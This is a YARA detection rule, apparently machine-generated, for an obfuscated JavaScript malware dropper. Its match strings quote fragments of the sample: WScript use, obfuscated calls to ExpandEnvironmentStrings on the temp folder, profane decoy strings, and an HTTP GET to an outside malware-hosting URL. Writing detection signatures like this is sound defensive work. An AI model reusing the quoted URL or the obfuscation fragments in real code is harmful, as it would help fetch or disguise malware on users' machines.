rule sig_20160428_1bb8a0e7b4fc3d214fe103fd567e89b8 {
  meta:
    description = "datamaliciousorder - file 20160428_1bb8a0e7b4fc3d214fe103fd567e89b8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "982e8ee10341e36a53f1a1d49f061a28ddbc52f40592a283b2f03b550405f4a6"

  strings:
    $s1  = "WwgVvgQxoMftIgpRaeKrl[GegKihFseRybNyfVncKmr](\"G\" + \"ET\", \"http://rabitaforex.com/pw3ksl\", false);" fullword ascii
    $s2  = "function IodRzbWmmAskEttEqdEyl(EdlLhyMnrScmAkuQdgSlt){BqbZanRccUljMksCdlWhx[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function IodRzbWmmAskEttEqdEyl(EdlLhyMnrScmAkuQdgSlt){BqbZanRccUljMksCdlWhx[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function RhoQsxWqoYjdXfgRrmNla() {return BqbZanRccUljMksCdlWhx[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "return VtvBewEspUadWtrPbrQfs - ObeAdbZqbYouWitPtlOpw;};" fullword ascii
    $s6  = "var BqbZanRccUljMksCdlWhx = function AhjDbsNfuZbyZboMftWjn() {return TirKipVpqMltWfxTfdFcc[EzpYttAhxTdxOscOcnJej](\"WScript\"+\"" ascii
    $s7  = "function YjiBdgOgiLbmDsdFfcKvd(VtvBewEspUadWtrPbrQfs, ObeAdbZqbYouWitPtlOpw){WurYfnTnpTfuBpwYgmYjt = WurYfnTnpTfuBpwYgmYjt * 1; " ascii
    $s8  = "var TirKipVpqMltWfxTfdFcc = this[\"WScript\"];" fullword ascii
    $s9  = "var BqbZanRccUljMksCdlWhx = function AhjDbsNfuZbyZboMftWjn() {return TirKipVpqMltWfxTfdFcc[EzpYttAhxTdxOscOcnJej](\"WScript\"+\"" ascii
    $s10 = "function RhoQsxWqoYjdXfgRrmNla() {return BqbZanRccUljMksCdlWhx[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (WwgVvgQxoMftIgpRaeKrl[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function JfkIbvZiwPlgVuoBciPdp(){return SyfXkrAmzBayUbmVnrMfu + \"\";};" fullword ascii
    $s13 = "function YjiBdgOgiLbmDsdFfcKvd(VtvBewEspUadWtrPbrQfs, ObeAdbZqbYouWitPtlOpw){WurYfnTnpTfuBpwYgmYjt = WurYfnTnpTfuBpwYgmYjt * 1; " ascii
    $s14 = "function FxzHgrAxuQbrDnfXsdQie() {return ((AmxEslXbpRolEfvNwtEyr == true) && (AmxEslXbpRolEfvNwtEyr == RctCqsOsoQzeMjsSlbDek)) ?" ascii
    $s15 = "function FxzHgrAxuQbrDnfXsdQie() {return ((AmxEslXbpRolEfvNwtEyr == true) && (AmxEslXbpRolEfvNwtEyr == RctCqsOsoQzeMjsSlbDek)) ?" ascii
    $s16 = "function LukXbcPinXydOtoCmcDlk()" fullword ascii
    $s17 = "var UgkEvsAecJvbExuDrpMee = false;" fullword ascii
    $s18 = "var CysNwqKpjLmcPiyEqhFzo = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "return YjiBdgOgiLbmDsdFfcKvd(1 == 1 ? UbpLvzRbcMwzTkiXtmTdq : 0, 1 == 1 ? XclPxkMnwHmqOreKzeRas : 0);" fullword ascii
    $s20 = "AmxEslXbpRolEfvNwtEyr = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}